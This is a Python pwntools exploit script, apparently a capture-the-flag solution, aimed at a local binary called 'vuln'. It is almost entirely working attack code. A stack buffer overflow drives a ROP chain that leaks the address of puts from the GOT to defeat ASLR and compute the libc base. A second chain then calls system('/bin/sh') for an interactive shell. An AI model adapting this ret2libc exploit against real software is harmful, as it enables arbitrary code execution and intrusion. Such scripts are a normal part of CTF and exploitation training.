from pwn import *


binpath = './vuln'
elf = ELF(binpath)
libc = ELF('./libc-2.31.so')

gdbscript = '''
gef
# b main
# scanf
b *0x401104
# ret
b *0x40111b
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)


addr_pop_rdi = 0x0000000000401273  # : pop rdi ; ret
addr_pop_rsi_r15 = 0x0000000000401271  # : pop rsi ; pop r15 ; ret
addr_pop_rsp_pop3 = 0x000000000040126d  # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
addr_ret = 0x000000000040101a  # : ret


# puts(got['puts'])
rop0 = b'A' * 0x48
rop0 += p64(addr_pop_rdi)
rop0 += p64(elf.got['puts'])
rop0 += p64(elf.plt['puts'])
rop0 += p64(elf.symbols['main'])
io.sendlineafter(b'feedback: \n', rop0)
io.recvuntil(b'!\n')

data = io.recvuntil(b'E')[:-1].rstrip()
print(data)
libc.address = u64(data.ljust(8, b'\x00')) - 0x875a0
print('libc.address = 0x{:x}'.format(libc.address))
print('system = 0x{:x}'.format(libc.symbols['system']))

# system('/bin/sh')
rop1 = b'B' * 0x48
rop1 += p64(addr_ret)
rop1 += p64(addr_pop_rdi)
rop1 += p64(next(libc.search(b'/bin/sh')))
rop1 += p64(libc.symbols['system'])
io.sendlineafter(b'feedback: \n', rop1)

io.interactive()
